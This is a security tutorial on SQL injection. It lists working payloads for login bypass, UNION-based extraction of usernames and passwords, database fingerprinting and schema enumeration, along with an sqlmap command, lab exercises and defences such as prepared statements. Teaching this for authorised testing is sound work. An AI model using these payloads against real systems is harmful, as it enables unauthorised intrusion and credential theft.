# SQL Injection Fundamentals

SQL injection is a code injection technique that exploits vulnerabilities in applications that interact with databases. When successful, attackers can read sensitive data, modify database data, execute admin operations, and sometimes even issue commands to the operating system.

## Introduction

SQL injection occurs when user input is incorrectly filtered and directly incorporated into SQL statements. This allows attackers to manipulate queries and gain unauthorized access to databases.

```
# Security principle: Always validate and sanitize user input
```

## Types of SQL Injection

### In-band SQLi

- **Error-based**: Forces the database to generate error messages that may reveal information about the database structure
- **Union-based**: Uses the UNION SQL operator to combine results from multiple SELECT statements

### Blind SQLi

- **Boolean-based**: Asks the database true/false questions and determines the answer based on the response
- **Time-based**: Forces the database to wait before responding to determine if a condition is true or false

### Out-of-band SQLi

- Uses features that allow the database to make DNS or HTTP requests to deliver data to the attacker

## Basic SQL Injection Techniques

### Testing for Vulnerabilities

Start with simple tests to determine if a field is vulnerable:

```sql
' OR '1'='1
' OR 1=1 --
" OR 1=1 --
') OR ('1'='1
```

### Understanding Error Messages

Database error messages can reveal valuable information:

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
```

### Basic Exploitation

```sql
-- Retrieve all users
' OR 1=1; --

-- Bypass login
admin' --

-- Union-based attack
' UNION SELECT username, password FROM users; --
```

## Advanced Techniques

### Database Fingerprinting

Determining the database type helps tailor your attacks:

```sql
-- MySQL
' UNION SELECT @@version; --

-- Oracle
' UNION SELECT banner FROM v$version; --

-- SQL Server
' UNION SELECT @@version; --
```

### Information Schema Queries

```sql
-- List all tables (MySQL)
' UNION SELECT table_name, 2 FROM information_schema.tables; --

-- List all columns in a table (MySQL)
' UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name='users'; --
```

### Extracting Data

```sql
-- Get usernames and passwords
' UNION SELECT username, password FROM users; --

-- Combining data when limited to one column
' UNION SELECT concat(username, ':', password) FROM users; --
```

## Defense Techniques

### Prepared Statements

```php
// PHP PDO example
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ?');
$stmt->execute([$username]);
```

### Input Validation

```javascript
// JavaScript example
function isValidInput(input) {
  return /^[a-zA-Z0-9]+$/.test(input);
}
```

### Least Privilege

- Database users should have minimal required permissions
- Web applications should use limited-access accounts

## Exercises

1. **Basic Detection**: Given the login form at http://localhost:8080/login:

   - Try entering `admin' --` as the username
   - Document the application's response
   - Does it reveal evidence of SQL injection vulnerability?

2. **Database Enumeration**: Using a vulnerable search field:

   - Determine the database type with version queries
   - Find table names using information schema
   - Extract column names from a target table

3. **Data Extraction**: Retrieve sensitive information:

   - Extract usernames and passwords from the discovered user table
   - Use the UNION operator to extract data from multiple tables
   - Document all extracted information systematically

4. **Blind SQLi Practice**:
   - Construct a time-based injection to verify vulnerability
   - Extract data one character at a time using binary search technique
   - Create a script to automate the extraction process

## Common Tools

- **SQLmap**: Automated SQL injection detection and exploitation

  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --dbs
  ```

- **Burp Suite**: Intercept and modify requests to test for injection points

- **OWASP ZAP**: Open-source web app scanner with SQLi detection

## Documentation Template

```
Target: [URL/endpoint]
Parameter tested: [parameter name]
Injection type: [Error-based/Union/Blind/etc.]

PAYLOADS USED:
- [list successful payloads]

DATABASE INFO:
- Type: [MySQL/MSSQL/Oracle/etc.]
- Version: [version number]

EXTRACTED SCHEMA:
- Tables: [discovered tables]
- Columns: [discovered columns]

EXTRACTED DATA:
- [sensitive data found]

RECOMMENDATIONS:
- [remediation steps]
```

Remember, always practice SQL injection techniques in a controlled, authorized environment.
